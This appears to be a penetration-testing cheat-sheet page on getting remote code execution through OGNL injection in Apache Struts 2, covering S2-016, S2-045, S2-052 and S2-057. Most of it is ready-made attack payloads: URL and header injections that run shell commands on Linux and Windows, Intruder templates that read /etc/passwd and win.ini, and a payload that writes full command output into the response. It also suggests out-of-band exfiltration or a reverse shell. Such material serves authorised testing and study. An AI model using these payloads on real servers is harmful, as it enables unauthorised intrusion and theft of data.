---
tags:
  - Web
---

# :material-leaf: Apache Struts

<span class="pill pill-hard">RCE machine</span> <span class="pill pill-info">web</span> <span class="pill pill-info">java</span>

Struts 2 is a Java MVC framework with a long history of **OGNL injection** bugs. When
user input reaches the OGNL expression evaluator, you get straight-to-root remote
code execution — no auth, no deserialization gadget hunting. If you fingerprint
Struts, this is almost always the fastest path to a shell.

!!! abstract "TL;DR"
    Look for `.action` / `.do` endpoints → test an OGNL arithmetic canary
    (`${3*4}` → `12`) → if it evaluates, weaponize the matching CVE payload for RCE.

## :material-magnify: Fingerprint & detect

```text
# Struts endpoints end in .action or .do
https://$TARGET/index.action
https://$TARGET/login.action
https://$TARGET/struts2-showcase/
```

The classic no-touch canary abuses the `redirect:` result type — if OGNL evaluates,
the arithmetic resolves in the `Location` header:

```text
https://$TARGET/Mainpage.action?redirect:${3*4}
# vulnerable  -> 302 Location: .../12
```

```text
# Command-exec confirmation (Linux) — evaluates and echoes VULNERABLE in the redirect
https://$TARGET/Mainpage.action?redirect:${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/sh","-c","echo+VULNERABLE"})).start()).getInputStream()))).readLine()}

# Windows
https://$TARGET/Mainpage.action?redirect:${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"cmd.exe","/c","echo+VULNERABLE"})).start()).getInputStream()))).readLine()}
```

If you get `Location: https://$TARGET/VULNERABLE` back, it evaluated — RCE is on.

!!! tip "One line at a time"
    The `redirect:` sink only returns a single line. Iterate with Burp Intruder:

    ```text
    # Windows — iterate §0§ from 0..N
    {"cmd.exe","/c","type+c:\win.ini|more+%2b§0§"}
    # Linux — iterate §1§ from 1..N
    {"/bin/sh","-c","cat+/etc/passwd|head+-§1§"}
    ```

## :material-bug: Key CVEs

| CVE | Alias | Vector |
| --- | --- | --- |
| CVE-2013-2251 | S2-016 | `action:` / `redirect:` / `redirectAction:` prefix → OGNL |
| CVE-2017-5638 | S2-045 | `Content-Type` header OGNL (Jakarta multipart parser) |
| CVE-2017-9805 | S2-052 | REST plugin XStream XML deserialization → RCE |
| CVE-2018-11776 | S2-057 | OGNL in URL/namespace when `alwaysSelectFullNamespace` is on |

## :material-fire: Exploitation

### S2-045 — Content-Type header OGNL (CVE-2017-5638)

The Jakarta multipart parser evaluates OGNL in a malformed `Content-Type`. Full
proof without touching a parameter — bounce a computed header back:

```http
POST /upload.action HTTP/1.1
Host: $TARGET
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Poc',5*10)}.multipart/form-data
```

A `X-Poc: 50` response header confirms code execution. `struts-pwn`
([mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)) automates detection
and command execution for this one.

### S2-052 — REST plugin XML deserialization (CVE-2017-9805)

Send an XML body to a REST endpoint; if different, force `Content-Type:
application/xml`. A vulnerable app may reply **500** and print a stack trace.

```text
# PoC: github.com/0x00-0x00/-CVE-2017-9805 (s2-052.py) — swap the command string
```

!!! bug "No command output on S2-052?"
    The gadget chain often fails with `java.lang.String cannot be cast to
    java.security.Provider$Service` — the command still runs, you just don't get
    stdout. Treat it as blind: exfil out-of-band or drop a reverse shell.

### S2-057 — URL/namespace OGNL (CVE-2018-11776)

OGNL injected via the URL path when namespace is derived from input. Try with and
without URL-encoding every character:

```text
https://$TARGET/struts2-showcase/${(111+111)}/actionChain1.action
https://$TARGET/struts2-showcase/${{111+111}}/actionChain1.action
# vulnerable -> request resolves to .../222/actionChain1.action
```

### Direct-write OGNL (no Intruder iteration)

This payload writes the full command output straight into the HTTP response,
avoiding line-by-line iteration:

```text
# Windows
?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'cmd','/c','dir'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[250],#d.read(#e),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.setContentType("html"),#matt.setCharacterEncoding("UTF-8"),#matt.getWriter().write(#e),#matt.getWriter().flush(),#matt.getWriter().close()}

# Linux — swap the command array for {'/bin/sh','-c','ls -la'}
```

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- OGNL RCE often lands as a Java service account → [Linux Privesc](../privesc/linux.md).
- Sibling Java deserialization sinks → [Deserialization](../web/deserialization.md).
- Reference: [Apache Struts security bulletins](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins).
